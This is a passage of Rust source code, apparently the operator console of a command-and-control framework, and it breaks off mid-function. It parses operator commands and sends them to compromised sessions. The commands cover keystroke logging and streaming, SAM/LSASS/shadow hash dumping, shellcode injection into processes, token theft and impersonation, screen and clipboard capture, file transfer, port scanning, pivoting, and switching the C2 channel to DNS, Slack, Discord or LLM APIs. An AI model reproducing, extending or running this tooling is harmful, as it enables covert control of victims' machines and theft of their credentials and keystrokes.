//! Slash-command dispatch（/menu 命令派发）。
//!
//! 从 `tui/mod.rs` 搬出（纯搬家，语义不变，仅按跨模块调用需要放宽 visibility）：
//! `App::submit` → `dispatch_line` → `run_shell` / `run_meta` 的完整派发管线，
//! 以及文件操作/session 元数据等参数解析助手。worker 发送走 [`App::send`]。

use ratatui::widgets::ListState;

use crate::rest::{Cmd, Level, ParseAs};
use crate::types::{CredEntry, SessionView};

use super::input::{
    self, destructive_confirm, parse_sleep_args, Input, SleepSpec, META_COMMANDS,
};
use super::overlay::{ConfirmAction, Overlay};
use super::{session_meta, short, topology, App};

/// Max entries kept in command history (older dropped). 与 stream_cap 对称，
/// 防止长时间运行（尤其自动化脚本通过 TUI 发大量命令）导致 history 无界增长。
const HISTORY_CAP: usize = 2000;

enum ShellFor {
    Ls,
    Ps,
    Creds,
}

impl App {
    /// 发命令到 worker。channel 断开（worker panic/退出）时不再静默吞错：
    /// 对操作命令（shell/bof/inject...）反馈到事件流，让操作员知道任务没发出去。
    fn send(&mut self, cmd: Cmd) {
        if self.conn.bridge.cmds.send(cmd).is_err() {
            self.log("! worker channel closed — command dropped", Level::Err);
            self.toast("! worker channel closed — command dropped", Level::Err);
        }
    }

    pub(super) fn submit(&mut self) {
        // 从焦点窗格取出输入，避免动到其他窗格的 input/cursor/popup。
        let raw = {
            let st = self.focused_state_mut();
            let r = std::mem::take(&mut st.input);
            st.cursor = 0;
            st.popup_open = false;
            st.hist_idx = None;
            r
        };
        if !raw.trim().is_empty() {
            self.input.history.push(raw.clone());
            // Cap history to prevent unbounded growth（P1-1c），与 STREAM_CAP 对称。
            if self.input.history.len() > HISTORY_CAP {
                let drop = self.input.history.len() - HISTORY_CAP;
                self.input.history.drain(..drop);
            }
        }
        // 破坏性命令确认拦截：/kill /rm /hide /neutralize /dump-lsass。
        // 拦截只发生在操作员新输入时；确认后走 dispatch_confirmed 直接派发，
        // 不再回到 submit，所以无需 bypass flag。
        if self.ovl.confirm.is_none() {
            if let Some(desc) = destructive_confirm(&raw) {
                self.ovl.confirm = Some(ConfirmAction {
                    cmd: raw.clone(),
                    description: self.build_confirm_description(&raw, desc),
                });
                return; // 等待 y/N，不派发
            }
        }
        self.dispatch_line(&raw);
    }

    /// Classify + dispatch a typed line, with no confirmation gating.
    ///
    /// Shared by [`submit`] (normal input) and the confirm-overlay `y` handler
    /// (re-dispatch of the stored destructive command). Keeping it separate
    /// means confirmation re-dispatch doesn't re-push history or re-trigger
    /// the intercept — the stored `cmd` already lives in history from the
    /// original `submit`.
    pub(super) fn dispatch_line(&mut self, raw: &str) {
        match input::classify_with(raw, &self.config.aliases) {
            Input::Empty => {}
            Input::Shell(cmd) => self.run_shell(&cmd),
            Input::Meta { name, args } => self.run_meta(&name, &args),
        }
    }

    fn run_shell(&mut self, cmd: &str) {
        let Some(s) = self.current_session().cloned() else {
            self.log(
                "! no session selected — use /use <id> or /sessions",
                Level::Err,
            );
            self.toast("! no session selected", Level::Err);
            return;
        };
        self.log(&format!("[{}] $ {}", short(&s.id), cmd), Level::Info);
        self.send(Cmd::Shell {
            session: s.id,
            args: cmd.to_string(),
            parse: ParseAs::None,
        });
    }

    pub(super) fn run_meta(&mut self, name: &str, args: &str) {
        match name {
            "/help" => {
                for m in META_COMMANDS {
                    self.log(
                        &format!("{:14} {:18} {}", m.name, m.args_hint, m.help),
                        Level::Info,
                    );
                }
            }
            "/clear" => self.stream.clear(),
            "/config" => {
                // /config                     — 显示当前可调运行时参数
                // /config stream_cap <N>      — 改事件流上限，改小立即裁剪
                let mut parts = args.split_whitespace();
                match parts.next() {
                    Some("stream_cap") => {
                        let n = match parts.next().and_then(|x| x.parse::<usize>().ok()) {
                            Some(v) => v,
                            None => {
                                self.log("usage: /config stream_cap <N>", Level::Warn);
                                return;
                            }
                        };
                        if n == 0 {
                            self.log("! stream_cap must be > 0", Level::Warn);
                            return;
                        }
                        let old = self.stream_cap;
                        self.stream_cap = n;
                        self.trim_stream();
                        self.log(
                            &format!("stream_cap: {old} → {n} (stream now {})", self.stream.len()),
                            Level::Ok,
                        );
                    }
                    Some(other) => self.log(
                        &format!("! /config: unknown key '{other}' (stream_cap)"),
                        Level::Err,
                    ),
                    None => self.log(
                        &format!(
                            "config: stream_cap={} (stream={}/{})",
                            self.stream_cap,
                            self.stream.len(),
                            self.stream_cap
                        ),
                        Level::Info,
                    ),
                }
            }
            "/theme" => {
                // /theme               — 显示当前主题
                // /theme nyx           — Nyx violet（默认）
                // /theme mocha         — Catppuccin Mocha
                // /theme frappe        — Catppuccin Frappé（medium-dark）
                // /theme macchiato     — Catppuccin Macchiato
                // /theme highcontrast  — WCAG AAA 高对比度
                // /theme nocolor       — 无色（遵守 NO_COLOR）
                let sub = args.trim();
                if sub.is_empty() {
                    // 空串 = 无配置，实际生效的是 Nyx 默认。
                    let cur = if self.config.theme.is_empty() {
                        "nyx"
                    } else {
                        self.config.theme.as_str()
                    };
                    self.log(
                        &format!(
                            "current theme: {cur} (options: nyx, mocha, frappe, macchiato, highcontrast, nocolor)"
                        ),
                        Level::Info,
                    );
                } else {
                    let valid = matches!(
                        sub.to_ascii_lowercase().as_str(),
                        "nyx" | "mocha" | "frappe" | "macchiato" | "highcontrast" | "hc" | "nocolor"
                    );
                    if !valid {
                        self.log(
                            &format!("! unknown theme '{sub}' (nyx | mocha | frappe | macchiato | highcontrast | nocolor)"),
                            Level::Warn,
                        );
                        return;
                    }
                    // 热切换调色板（RwLock 写入，立即生效，下一帧渲染就用新色）。
                    crate::theme::switch(sub);
                    // 持久化到配置文件，下次启动生效。
                    self.config.theme = sub.to_string();
                    match self.config.save() {
                        Ok(()) => self.log(&format!("theme switched to {sub}"), Level::Ok),
                        Err(e) => {
                            self.log(&format!("theme switched but save failed: {e}"), Level::Warn)
                        }
                    }
                }
            }
            "/alias" => {
                // /alias add <name> <command...>  /  /alias rm <name>  /  /alias list
                let mut parts = args.split_whitespace();
                match parts.next() {
                    Some("add") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias add <name> <command...>", Level::Warn);
                                return;
                            }
                        };
                        let cmd: String = parts.collect::<Vec<_>>().join(" ");
                        if cmd.is_empty() {
                            self.log("usage: /alias add <name> <command...>", Level::Warn);
                            return;
                        }
                        self.config.set_alias(&name, &cmd);
                        match self.config.save() {
                            Ok(()) => self.log(&format!("alias {name} = {cmd}"), Level::Ok),
                            Err(e) => self.log(&format!("! save alias: {e}"), Level::Err),
                        }
                    }
                    Some("rm") | Some("del") | Some("remove") => {
                        let name = match parts.next() {
                            Some(n) => n.to_string(),
                            None => {
                                self.log("usage: /alias rm <name>", Level::Warn);
                                return;
                            }
                        };
                        if self.config.del_alias(&name) {
                            let _ = self.config.save();
                            self.log(&format!("removed alias {name}"), Level::Ok);
                        } else {
                            self.log(&format!("! no alias named {name}"), Level::Warn);
                        }
                    }
                    Some("list") | None => {
                        if self.config.aliases.is_empty() {
                            self.log("(no aliases)", Level::Warn);
                        } else {
                            let pairs: Vec<(String, String)> = self
                                .config
                                .aliases
                                .iter()
                                .map(|(n, c)| (n.clone(), c.clone()))
                                .collect();
                            for (n, c) in &pairs {
                                self.log(&format!("  {n} = {c}"), Level::Info);
                            }
                        }
                    }
                    Some(other) => self.log(
                        &format!("! /alias: unknown subcommand '{other}' (add/rm/list)"),
                        Level::Err,
                    ),
                }
            }
            "/topo" => {
                // 用拓扑布局算法画 session 关系图。
                let nodes: Vec<(String, String)> = self.sess.list
                    .iter()
                    .map(|s| {
                        let label = self.sess.meta
                            .get(&s.id)
                            .alias
                            .clone()
                            .unwrap_or_else(|| s.hostname.clone());
                        (s.id.clone(), label)
                    })
                    .collect();
                let topo = topology::layout(&nodes, &[]);
                if topo.nodes.is_empty() {
                    self.log("(no sessions to graph)", Level::Warn);
                } else {
                    self.log(
                        &format!(
                            "╔══ topology: {} nodes, {} edges ═══",
                            topo.nodes.len(),
                            topo.edges.len()
                        ),
                        Level::Info,
                    );
                    // 按层分组渲染 ASCII 树
                    let max_y = topo.nodes.iter().map(|n| n.y).max().unwrap_or(0);
                    for layer in 0..=max_y {
                        let layer_nodes: Vec<&topology::TopoNode> =
                            topo.nodes.iter().filter(|n| n.y == layer).collect();
                        if layer_nodes.is_empty() {
                            continue;
                        }
                        // 层标签
                        if layer == 0 {
                            self.log("║", Level::Info);
                        }
                        // 节点行
                        let node_strs: Vec<String> = layer_nodes
                            .iter()
                            .map(|n| {
                                // ●/○ 与连接状态点统一（render_statusbar），填充=活跃。
                                let mark = if n.is_beacon { "●" } else { "○" };
                                let star = if self.sess.meta.get(&n.id).favorite {
                                    " ★"
                                } else {
                                    ""
                                };
                                format!("{mark} {}{star}", n.label)
                            })
                            .collect();
                        self.log(
                            &format!("║  L{}  {}", layer, node_strs.join("  ──→  ")),
                            Level::Info,
                        );
                        // 连接线（非最后一层）
                        if layer < max_y {
                            self.log("║  │", Level::Info);
                        }
                    }
                    // 边列表
                    if !topo.edges.is_empty() {
                        self.log("║", Level::Info);
                        self.log("║  edges:", Level::Info);
                        for e in &topo.edges {
                            self.log(
                                &format!(
                                    "║    {} ─{}→ {}",
                                    short_topo(&topo, &e.from),
                                    e.label,
                                    short_topo(&topo, &e.to)
                                ),
                                Level::Info,
                            );
                        }
                    }
                    self.log("╚══════════════════════════════", Level::Info);
                }
            }
            "/creds" => {
                // /creds                 — 列出整个凭据库
                // /creds export json|csv — 导出
                // /creds find <query>    — 搜索（kind:hash / user:admin）
                // /creds sync [reveal]   — 从 server /api/creds 拉取并入库
                // /creds <shell cmd>     — 跑 shell dump，结果解析后入库
                let sub = args.trim();
                if sub == "export json" {
                    self.log(&self.creds.export_json(), Level::Info);
                } else if sub == "export csv" {
                    self.log(&self.creds.export_csv(), Level::Info);
                } else if let Some(query) = sub.strip_prefix("find ") {
                    // 搜索凭据库
                    let hits = self.creds.search(query.trim());
                    if hits.is_empty() {
                        self.log(&format!("(no creds match '{query}')"), Level::Warn);
                    } else {
                        let rows: Vec<CredEntry> = hits
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.log(&format!("{} match(es)", rows.len()), Level::Ok);
                        self.ovl.overlay = Overlay::Creds(rows);
                        self.ovl.scroll = 0;
                    }
                } else if sub == "list" || sub.is_empty() {
                    if self.creds.entries.is_empty() {
                        self.log(
                            "(credstore empty — run a cred dump BOF or /creds sync first)",
                            Level::Warn,
                        );
                    } else {
                        let rows: Vec<CredEntry> = self
                            .creds
                            .entries
                            .iter()
                            .map(|c| CredEntry {
                                source: c.source.clone(),
                                principal: c.principal.clone(),
                                kind: c.kind,
                                secret: c.secret.clone(),
                            })
                            .collect();
                        self.ovl.overlay = Overlay::Creds(rows);
                        self.ovl.scroll = 0;
                    }
                } else if sub.starts_with("add ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    let secret = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() || secret.is_empty() {
                        self.log(
                            "usage: /creds add <realm> <user> <kind> <secret>",
                            Level::Warn,
                        );
                        return;
                    }
                    self.send(crate::rest::Cmd::AddCred {
                        realm,
                        user,
                        kind,
                        secret,
                    });
                } else if sub.starts_with("del ") {
                    let mut parts = sub.split_whitespace().skip(1);
                    let realm = parts.next().unwrap_or("").to_string();
                    let user = parts.next().unwrap_or("").to_string();
                    let kind = parts.next().unwrap_or("").to_string();
                    if realm.is_empty() || user.is_empty() || kind.is_empty() {
                        self.log("usage: /creds del <realm> <user> <kind>", Level::Warn);
                        return;
                    }
                    self.send(crate::rest::Cmd::DelCred { realm, user, kind });
                } else if sub == "sync" || sub.starts_with("sync ") {
                    let reveal = sub.contains("reveal");
                    self.send(Cmd::FetchCreds { reveal });
                } else {
                    // 当作 shell 命令跑，结果解析后入库
                    self.run_parsed_shell(sub, "/creds", ShellFor::Creds);
                }
            }
            "/profile" => {
                self.send(crate::rest::Cmd::FetchProfile);
            }
            "/chan" => {
                let mut parts = args.split_whitespace();
                let sub = match parts.next() {
                    Some(s) => s,
                    None => {
                        self.log("usage: /chan close <id>", Level::Warn);
                        return;
                    }
                };
                if sub == "close" {
                    let chan: u32 = match parts.next().and_then(|x| x.parse().ok()) {
                        Some(c) => c,
                        None => {
                            self.log("usage: /chan close <id>", Level::Warn);
                            return;
                        }
                    };
                    self.send(crate::rest::Cmd::CloseChan { chan });
                } else {
                    self.log(
                        &format!("! /chan: unknown subcommand '{sub}' (close)"),
                        Level::Err,
                    );
                }
            }
            "/audit" => {
                let sub = args.trim();
                if sub == "verify" {
                    self.send(crate::rest::Cmd::VerifyAudit);
                    return;
                }
                // /audit                       — 全量审计日志
                // /audit operator <name>       — 按操作员过滤
                // /audit action <task|cred_*>  — 按动作过滤
                // /audit limit <n>             — 限制条数
                let mut filters: Option<String> = None;
                let mut operator: Option<String> = None;
                let mut action: Option<String> = None;
                let mut limit: Option<u32> = None;
                let mut it = args.split_whitespace();
                while let Some(k) = it.next() {
                    match k {
                        "operator" => operator = it.next().map(|s| s.to_string()),
                        "action" => action = it.next().map(|s| s.to_string()),
                        "limit" => limit = it.next().and_then(|s| s.parse().ok()),
                        _ => {
                            filters = Some(k.to_string());
                        }
                    }
                }
                let _ = filters;
                self.send(Cmd::FetchAudit {
                    operator,
                    action,
                    limit,
                });
            }
            "/connect" => {
                let mut parts = args.split_whitespace();
                let url = match parts.next() {
                    Some(u) => u.to_string(),
                    None => {
                        self.log("usage: /connect <url> [token]", Level::Warn);
                        return;
                    }
                };
                let token = parts.next().map(|s| s.to_string());
                self.log(&format!("connecting to {url} …",), Level::Info);
                self.toast(format!("connecting to {url} …"), Level::Info);
                self.send(Cmd::Connect(url, token));
            }
            "/sessions" => {
                if self.sess.list.is_empty() {
                    self.log("(no sessions)", Level::Warn);
                } else {
                    // 支持过滤：/sessions tag:web star alias:db
                    let filter = session_meta::parse_filter(args);
                    let filtered: Vec<usize> = self.sess.list
                        .iter()
                        .enumerate()
                        .filter(|(_, s)| {
                            let m = self.sess.meta.get(&s.id);
                            let tags_ok = filter.tags.iter().all(|t| m.tags.iter().any(|x| x == t));
                            let star_ok = !filter.star_only || m.favorite;
                            let alias_ok = filter.alias_contains.as_ref().is_none_or(|sub| {
                                m.alias.as_ref().is_some_and(|a| a.contains(sub))
                                    || s.hostname.contains(sub)
                            });
                            tags_ok && star_ok && alias_ok
                        })
                        .map(|(i, _)| i)
                        .collect();
                    if filtered.is_empty() {
                        self.log(&format!("(no sessions match '{args}')",), Level::Warn);
                    } else {
                        let mut st = ListState::default();
                        let cur_idx = self
                            .current_session()
                            .and_then(|s| self.sess.list.iter().position(|x| x.id == s.id));
                        st.select(
                            cur_idx
                                .filter(|i| filtered.contains(i))
                                .or(filtered.first().copied()),
                        );
                        self.ovl.overlay = Overlay::Sessions(st);
                        self.ovl.scroll = 0;
                    }
                }
            }
            "/info" => {
                // 全字段会话详情 overlay：把 SessionView 里一直有但 Sessions 行
                // 列表/状态栏放不下的字段（pid/pending/age/ja3/ja4 + 本地 meta）
                // 一次性展示。本地数据 overlay，无 worker round-trip。
                match self.current_session() {
                    Some(s) => {
                        self.ovl.overlay = Overlay::SessionDetail(s.id.clone());
                        self.ovl.scroll = 0;
                    }
                    None => self.log("! no session selected", Level::Warn),
                }
            }
            "/tasks" => {
                // 拉取当前会话排队中（未投递）的任务。worker-driven overlay，
                // 仿 /audit。解决"任务下发后状态黑盒"——看不到是还在排队还是已投递。
                match self.current_session() {
                    Some(s) => self.send(Cmd::FetchTasks {
                        session: s.id.clone(),
                    }),
                    None => self.log("! no session selected", Level::Warn),
                }
            }
            "/use" => {
                let id = args.trim();
                if id.is_empty() {
                    self.log("usage: /use <id-prefix>", Level::Warn);
                    return;
                }
                match self.sess.list.iter().position(|s| s.id.starts_with(id)) {
                    Some(i) => {
                        if let Some(s) = self.sess.list.get(i) {
                            self.panes.tree
                                .set_session_id(self.panes.focused, Some(s.id.clone()));
                        }
                        self.log(
                            &format!("selected session {}", short(&self.sess.list[i].id)),
                            Level::Ok,
                        );
                    }
                    None => self.log(&format!("! no session matching {id}"), Level::Err),
                }
            }
            "/rename" | "/tag" | "/untag" | "/star" | "/note" => {
                self.session_meta_cmd(name, args);
            }
            "/ls" => self.run_parsed_shell(args, "/ls", ShellFor::Ls),
            "/ps" => self.run_parsed_shell(args, "/ps", ShellFor::Ps),
            "/bof" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    self.toast("! select a session first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /bof <file.o> [args]", Level::Warn);
                        return;
                    }
                };
                let bof_args = parts.collect::<Vec<_>>().join(" ");
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                let name = std::path::Path::new(&file)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("bof")
                    .to_string();
                self.log(&format!("[{}] bof {} …", short(&s.id), name), Level::Info);
                self.send(Cmd::Bof {
                    session: s.id,
                    name,
                    args: bof_args,
                    data_hex: hex::encode(&data),
                });
            }
            "/upload" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let local = match parts.next() {
                    Some(l) => l.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let remote = match parts.next() {
                    Some(r) => r.to_string(),
                    None => {
                        self.log("usage: /upload <local> <remote>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&local) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {local}: {e}"), Level::Err);
                        return;
                    }
                };
                self.log(
                    &format!("[{}] upload {local} -> {remote}", short(&s.id)),
                    Level::Info,
                );
                self.send(Cmd::Upload {
                    session: s.id,
                    name: remote,
                    data_hex: hex::encode(&data),
                });
            }
            "/download" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let mut parts = args.split_whitespace();
                let path = match parts.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /download <remote> [local]", Level::Warn);
                        return;
                    }
                };
                let local = parts.next().map(|s| s.to_string());
                self.log(&format!("[{}] download {path}", short(&s.id)), Level::Info);
                self.send(Cmd::Download {
                    session: s.id,
                    path,
                    local,
                });
            }
            "/sleep" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                match parse_sleep_args(args) {
                    SleepSpec::Seconds(secs) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: 0,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::SecondsJitter(secs, jit) => {
                        self.send(Cmd::Sleep {
                            session: s.id.clone(),
                            seconds: secs,
                            jitter_pct: jit,
                        });
                        self.log(
                            &format!("[{}] tasked sleep {secs}s (±{jit}%)", short(&s.id)),
                            Level::Info,
                        );
                    }
                    SleepSpec::Usage(msg) => self.log(&msg, Level::Warn),
                }
            }
            "/ping" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Ping { session: s.id });
            }
            "/screenshot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let monitor: u8 = args.trim().parse().unwrap_or(0);
                self.log(&format!("[{}] screenshot…", short(&s.id)), Level::Info);
                self.send(Cmd::Screenshot {
                    session: s.id,
                    monitor,
                });
            }
            "/portscan" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                let ports = match it.next() {
                    Some(p) => p.to_string(),
                    None => {
                        self.log("usage: /portscan <host> <ports>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Portscan {
                    session: s.id,
                    host,
                    ports,
                });
            }
            "/net" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Net {
                    session: s.id,
                    query: args.trim().to_string(),
                });
            }
            "/drive" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::DriveInfo { session: s.id });
            }
            "/trex" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Trex { session: s.id });
            }
            "/channel" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let trimmed = args.trim();
                if trimmed.is_empty() {
                    // No argument — list all available channels with their IDs.
                    self.log("C2 transport channels:", Level::Info);
                    self.log("  0 https   — HTTPS POST (default)", Level::Info);
                    self.log("  1 doh     — DNS-over-HTTPS", Level::Info);
                    self.log("  2 dns     — DNS beacon", Level::Info);
                    self.log("  3 smb     — SMB Named Pipe (pivot)", Level::Info);
                    self.log("  4 tcp     — TCP Beacon (pivot)", Level::Info);
                    self.log("  5 slack   — External C2 via Slack", Level::Info);
                    self.log("  6 llm     — External C2 via LLM API", Level::Info);
                    self.log("  7 mcp     — External C2 via MCP", Level::Info);
                    self.log("  8 discord — External C2 via Discord", Level::Info);
                    self.log("usage: /channel <id|name>  e.g. /channel doh", Level::Info);
                    return;
                }
                // Accept either a numeric ID (0-8) or a channel name.
                let ch: u8 = if let Ok(n) = trimmed.parse::<u8>() {
                    n
                } else {
                    match trimmed.to_ascii_lowercase().as_str() {
                        "https" | "http" => 0,
                        "doh" | "dohdns" | "doh-dns" => 1,
                        "dns" => 2,
                        "smb" | "smbpipe" | "smb-pipe" | "pipe" => 3,
                        "tcp" => 4,
                        "slack" | "slackapi" | "slack-api" => 5,
                        "llm" | "llmapi" | "llm-api" => 6,
                        "mcp" => 7,
                        "discord" | "discordapi" | "discord-api" => 8,
                        _ => {
                            self.log(
                                &format!("! unknown channel '{trimmed}'. /channel for list."),
                                Level::Err,
                            );
                            return;
                        }
                    }
                };
                if ch > 8 {
                    self.log("! channel ID must be 0-8. /channel for list.", Level::Err);
                    return;
                }
                let names = [
                    "HTTPS", "DoH-DNS", "DNS", "SMB Pipe", "TCP",
                    "Slack API", "LLM API", "MCP", "Discord API",
                ];
                self.log(
                    &format!("switching to {} ({})", ch, names.get(ch as usize).unwrap_or(&"?")),
                    Level::Info,
                );
                self.send(Cmd::SetChannel {
                    session: s.id,
                    channel: ch,
                });
            }
            "/clipboard" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Clipboard { session: s.id });
            }
            "/env" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Env {
                    session: s.id,
                    name: args.trim().to_string(),
                });
            }
            "/keylog" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                // `/keylog stream [secs]` — continuous dump (re-enqueues every
                // N seconds, default 5, minimum 2). `unstream` stops the loop.
                let trimmed = args.trim();
                if trimmed == "stream" || trimmed.starts_with("stream ") {
                    let secs: u32 = trimmed
                        .split_whitespace()
                        .nth(1)
                        .and_then(|x| x.parse().ok())
                        .unwrap_or(5);
                    self.send(Cmd::KeylogStreamStart {
                        session: s.id.clone(),
                        interval_secs: secs,
                    });
                    let msg = format!("[{}] keylog stream every {secs}s", short(&s.id));
                    self.log(&msg, Level::Info);
                    self.toast(msg, Level::Ok);
                    return;
                }
                if trimmed == "unstream" || trimmed == "stop-stream" {
                    self.send(Cmd::KeylogStreamStop { session: s.id });
                    return;
                }
                let action = match trimmed {
                    "start" => 0,
                    "stop" => 1,
                    "dump" | "" => 2,
                    _ => {
                        self.log(
                            "usage: /keylog <start|stop|dump|stream [secs]|unstream>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                self.send(Cmd::Keylog {
                    session: s.id,
                    action,
                });
            }

            "/screenwatch" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let secs: u32 = match args.trim().parse() {
                    Ok(v) if v > 0 => v,
                    _ => {
                        self.log("usage: /screenwatch <secs>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Screenwatch {
                    session: s.id,
                    interval_secs: secs,
                });
            }
            "/hashdump" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                // method 语义（跨后端统一）：0=SAM, 1=SYSTEM, 2=LSASS(deferred),
                // 3=macOS-shadow。默认 sam(0)。`lsass`/`mac` 保留为兼容别名但
                // 映射到正确语义（lsass→2 deferred，mac→3 shadow）。
                let method = match args.trim() {
                    "sam" | "" => 0,
                    "system" => 1,
                    "lsass" => 2,
                    "shadow" | "mac" => 3,
                    other => {
                        self.log(
                            &format!("! unknown hashdump method '{other}': use sam|system|shadow"),
                            Level::Err,
                        );
                        return;
                    }
                };
                self.send(Cmd::Hashdump {
                    session: s.id,
                    method,
                });
            }
            "/getuid" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::GetUid { session: s.id });
            }
            "/inject" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                // /inject <method> <pid|spawn_to> <file.bin>
                let mut parts = args.split_whitespace();
                let method: u8 = match parts.next().and_then(|m| m.parse().ok()) {
                    Some(v) => v,
                    None => {
                        self.log(
                            "usage: /inject <method 0|1|2> <pid|spawn_to> <file>",
                            Level::Warn,
                        );
                        return;
                    }
                };
                let target = parts.next().unwrap_or("").to_string();
                let file = match parts.next() {
                    Some(f) => f.to_string(),
                    None => {
                        self.log("usage: /inject <method> <pid|spawn_to> <file>", Level::Warn);
                        return;
                    }
                };
                let data = match std::fs::read(&file) {
                    Ok(d) => d,
                    Err(e) => {
                        self.log(&format!("! read {file}: {e}"), Level::Err);
                        return;
                    }
                };
                // Parse target: if numeric, it's a pid; otherwise spawn_to name.
                let (pid, spawn_to) = match target.parse::<u32>() {
                    Ok(p) => (p, String::new()),
                    Err(_) => (0, target),
                };
                let sc_hex = hex::encode(&data);
                self.send(Cmd::Inject {
                    session: s.id,
                    method,
                    pid,
                    spawn_to,
                    sc_hex,
                });
            }
            "/steal" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let pid: u32 = match args.trim().parse() {
                    Ok(v) => v,
                    _ => {
                        self.log("usage: /steal <pid>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::StealToken { session: s.id, pid });
            }
            "/make_token" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                // /make_token DOMAIN\user password [logon_type 1|2|3]
                let parts: Vec<&str> = args.split_whitespace().collect();
                if parts.len() < 2 {
                    self.log(
                        "usage: /make_token DOMAIN\\user password [1|2|3]",
                        Level::Err,
                    );
                    return;
                }
                let du = parts[0];
                let (domain, user) = match du.split_once('\\') {
                    Some((d, u)) => (d.to_string(), u.to_string()),
                    None => (String::new(), du.to_string()), // local account
                };
                let password = parts[1].to_string();
                let logon_type = parts.get(2).and_then(|t| t.parse::<u8>().ok()).unwrap_or(1);
                self.send(Cmd::MakeToken {
                    session: s.id,
                    domain,
                    user,
                    password,
                    logon_type,
                });
            }
            "/rev2self" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                self.send(Cmd::Rev2Self { session: s.id });
            }
            "/cd" | "/mkdir" | "/rm" => {
                let (op, path) = self.fileop_one_arg(name, args);
                let Some((s, p)) = path else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: p,
                    dest: None,
                });
            }
            "/mv" | "/cp" => {
                let (op, parts) = self.fileop_two_args(name, args);
                let Some((s, src, dst)) = parts else { return };
                self.send(Cmd::FileOp {
                    session: s.id,
                    op,
                    path: src,
                    dest: Some(dst),
                });
            }
            "/pivot" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                let host = match it.next() {
                    Some(h) => h.to_string(),
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                let port: u16 = match it.next().and_then(|p| p.parse().ok()) {
                    Some(p) => p,
                    None => {
                        self.log("usage: /pivot <host> <port>", Level::Warn);
                        return;
                    }
                };
                self.send(Cmd::Pivot {
                    session: s.id,
                    host,
                    port,
                });
            }
            "/socks" => {
                let Some(s) = self.current_session().cloned() else {
                    self.log("! select a session first", Level::Err);
                    return;
                };
                let mut it = args.split_whitespace();
                // Two forms:
                //   /socks start [bind_addr]   — in-TUI SOCKS5 relay (default 127.0.0.1:1080)
                //   /socks stop                — stop the in-TUI relay
                //   /socks <chan> <op> <addr> <port> — manual channel control frame
                // The first token disambiguates: "start"/"stop" are the relay
                // subcommands; anything else is parsed as the legacy control form.
                let first = it.next().unwrap_or("");
                if first.eq_ignore_ascii_case("start") {
